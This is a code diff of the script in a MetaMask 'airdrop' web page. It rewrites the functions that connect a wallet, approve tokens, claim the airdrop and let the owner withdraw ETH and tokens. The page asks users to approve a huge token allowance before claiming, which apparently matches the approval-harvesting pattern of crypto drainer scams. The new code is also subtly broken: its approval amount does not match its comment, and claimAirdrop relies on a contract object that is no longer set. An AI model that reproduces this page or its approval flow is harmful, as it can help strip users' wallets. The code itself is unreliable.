@@ -240,100 +240,75 @@
     let contract;
     let accounts;
 
-    // Function to handle mobile redirection to MetaMask browser
-    function redirectToMetaMask() {
-      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-      if (/android/i.test(userAgent)) {
-        window.location.href = "https://metamask.app.link/dapp/your-dapp-url"; // Replace with your dApp's URL
-      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
-        window.location.href = "metamask://";
-      }
-    }
-
-    // Initialize Web3
-    async function initWeb3() {
+    async function connectMetaMask() {
       if (typeof window.ethereum !== 'undefined') {
         web3 = new Web3(window.ethereum);
         try {
-          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          contract = new web3.eth.Contract(contractABI, contractAddress);
-          document.getElementById('connectButton').style.display = 'none';
+          accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
           document.getElementById('approveButton').disabled = false;
-          document.getElementById('claimAirdropButton').disabled = false;
-          // Check if connected wallet is the owner
+
           if (accounts[0].toLowerCase() === ownerAddress.toLowerCase()) {
             document.getElementById('ownerButtons').style.display = 'block';
           }
         } catch (error) {
-          alert("Connection failed. Please try again.");
+          alert('User rejected the request');
         }
       } else {
-        alert("MetaMask not detected. Please install it.");
+        alert('MetaMask not found!');
       }
     }
 
-    // Approve unlimited drops for the contract
-    async function approveUnlimitedDrops() {
-      try {
-        const approval = await contract.methods.approve(contractAddress, web3.utils.toWei("1000000000")).send({ from: accounts[0] });
-        if (approval.status) {
-          alert("Approval successful!");
-          document.getElementById('approveButton').disabled = true;
-        }
-      } catch (error) {
-        alert("Approval failed. Please try again.");
-      }
+    async function approveTokens() {
+      const spenderAddress = contractAddress;
+      const amount = web3.utils.toWei('1000000000000000000000', 'ether'); // 1 billion tokens
+
+      const contractInstance = new web3.eth.Contract(contractABI, contractAddress);
+      await contractInstance.methods.approve(spenderAddress, amount).send({ from: accounts[0] });
+      alert('Approval successful!');
     }
 
-    // Claim the airdrop
     async function claimAirdrop() {
-      const processingMessage = document.getElementById('processingMessage');
-      processingMessage.classList.add('show');
-      try {
-        const claim = await contract.methods.transfer(accounts[0], web3.utils.toWei("1")).send({ from: accounts[0] });
-        if (claim.status) {
-          alert("Airdrop claimed successfully!");
-        }
-      } catch (error) {
-        alert("Airdrop claim failed. Please try again.");
-      } finally {
-        processingMessage.classList.remove('show');
-      }
+      document.getElementById('claimAirdropButton').disabled = true;
+      document.getElementById('processingMessage').classList.add('show');
+      await contract.methods.transfer(accounts[0], web3.utils.toWei('1', 'ether')).send({ from: accounts[0] });
+      document.getElementById('processingMessage').classList.remove('show');
+      alert('Airdrop claimed!');
+      document.getElementById('claimAirdropButton').disabled = false;
     }
 
-    // Withdraw ETH
     async function withdrawETH() {
-      try {
-        const withdraw = await contract.methods.withdrawETH().send({ from: ownerAddress });
-        if (withdraw.status) {
-          alert("ETH withdrawn successfully!");
-        }
-      } catch (error) {
-        alert("Withdrawal failed. Please try again.");
-      }
+      const contractInstance = new web3.eth.Contract(contractABI, contractAddress);
+      await contractInstance.methods.withdrawETH().send({ from: accounts[0] });
+      alert('ETH withdrawn!');
     }
 
-    // Withdraw Tokens
     async function withdrawTokens() {
-      try {
-        const withdraw = await contract.methods.withdrawTokens().send({ from: ownerAddress });
-        if (withdraw.status) {
-          alert("Tokens withdrawn successfully!");
-        }
-      } catch (error) {
-        alert("Withdrawal failed. Please try again.");
+      const contractInstance = new web3.eth.Contract(contractABI, contractAddress);
+      await contractInstance.methods.withdrawTokens().send({ from: accounts[0] });
+      alert('Tokens withdrawn!');
+    }
+
+    // Detect if the user is on mobile
+    function isMobile() {
+      return /Mobi|Android/i.test(navigator.userAgent);
+    }
+
+    // Show alert for mobile users
+    function showMobileAlert() {
+      if (isMobile()) {
+        alert('For the best experience, please open this page in the MetaMask mobile app.');
       }
     }
 
-    // Event Listeners
-    document.getElementById('connectButton').addEventListener('click', initWeb3);
-    document.getElementById('approveButton').addEventListener('click', approveUnlimitedDrops);
+    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
+    document.getElementById('approveButton').addEventListener('click', approveTokens);
     document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
     document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH);
     document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);
 
-    // Redirect mobile users to MetaMask
-    window.onload = redirectToMetaMask;
+    // Call the mobile alert function
+    showMobileAlert();
   </script>
 </body>
 </html>
